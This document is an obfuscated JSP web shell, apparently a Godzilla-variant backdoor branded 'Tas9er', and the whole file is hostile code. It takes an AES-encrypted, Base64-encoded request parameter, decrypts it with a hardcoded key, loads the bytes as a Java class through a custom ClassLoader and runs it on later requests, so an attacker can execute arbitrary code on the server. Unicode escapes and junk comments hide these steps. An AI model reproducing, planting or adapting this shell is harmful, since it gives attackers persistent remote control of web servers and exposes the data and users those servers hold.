Hello Administrator!Welcome To Tas9er Godzilla JSP Console!
<%! String govsb_xzgV3j8LF7Os6 = "630e7dd50088768a";
    String govsb_N6HHQql = "Tas9er";
    class govsb_syyk9syq extends /*edusb_gg6lfWc*/ClassLoader {
        public govsb_syyk9syq(ClassLoader govsb_SMNlO2HiISLPcWF) {
            super/*edusb_Qqs*/(govsb_SMNlO2HiISLPcWF);
        }
        public Class govsb_43rHEEUZBGGVvb(byte[] govsb_Rf4Bd95) {
            return super./*edusb_lpcHiu*/\u0064\u0065\u0066\u0069\u006e\u0065\u0043\u006c\u0061\u0073\u0073/*edusb_lSe5*/(govsb_Rf4Bd95, 794591-794591, govsb_Rf4Bd95.length);
        }
    }
    public byte[] govsb_x0wMu5BMMs7M(byte[] govsb_V4XUIbYq, boolean govsb_6muSOwuTBMzMAT) {
        try {
            j\u0061\u0076\u0061\u0078./*edusb_WqvZDZTP*/\u0063\u0072\u0079\u0070\u0074\u006f.Cipher govsb_7X09tYHl0V = j\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.Cipher.\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063e/*edusb_l3YLVf0ub423r*/("AES");
            govsb_7X09tYHl0V.init(govsb_6muSOwuTBMzMAT?794591/794591:794591/794591+794591/794591,new j\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.spec./*edusb_jkqTV8*/SecretKeySpec/*edusb_MwzZl1R7XnkY6Sn*/(govsb_xzgV3j8LF7Os6.getBytes(), "AES"));
            return govsb_7X09tYHl0V.doFinal/*edusb_jo0S3A9SeUQvZ*/(govsb_V4XUIbYq);
        } catch (Exception e) {
            return null;
        }
     }
    %><%
    try {
        byte[] govsb_AE2yqa95 = java.util.Base64./*edusb_Ez5brYQFHCQBT*/\u0067\u0065\u0074\u0044\u0065\u0063\u006f\u0064\u0065\u0072()./*edusb_7EP*/decode(request.getParameter(govsb_N6HHQql));
        govsb_AE2yqa95 = govsb_x0wMu5BMMs7M(govsb_AE2yqa95,false);
        if (session.getAttribute/*edusb_sDqjG9D*/("payload") == null) {
            session.setAttribute("payload", new govsb_syyk9syq(this.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073()./*edusb_aPP1k2J*/\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073Loader())/*edusb_SGDS1uh3l1kNv0*/.govsb_43rHEEUZBGGVvb(govsb_AE2yqa95));
        } else {
            request.setAttribute("parameters", govsb_AE2yqa95);
            java.io.ByteArrayOutputStream govsb_5scOusL1ndV2 = new java.io./*edusb_ChZm*/ByteArrayOutputStream();
            Object govsb_SQ = /*edusb_VleknzE*/((Class) session.getAttribute("payload"))./*edusb_H6m3aous*//*edusb_SPFOLerISHSCf*/new\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065()/*edusb_U0MIbGb*/;
            govsb_SQ.equals(govsb_5scOusL1ndV2);
            govsb_SQ.equals(pageContext);
            response.getWriter().write("573D096D86F04320013C934E490B0360".substring(794591-794591, 16));
            govsb_SQ.toString();
            response.getWriter().write(java.util.Base64/*edusb_c06iomCevFS*/.getEncoder()/*edusb_G*/.encodeToString(govsb_x0wMu5BMMs7M(govsb_5scOusL1ndV2.toByteArray(),true)));
            response.getWriter().write("573D096D86F04320013C934E490B0360".substring(16));
        }
    } catch (Exception e) {
    }
%>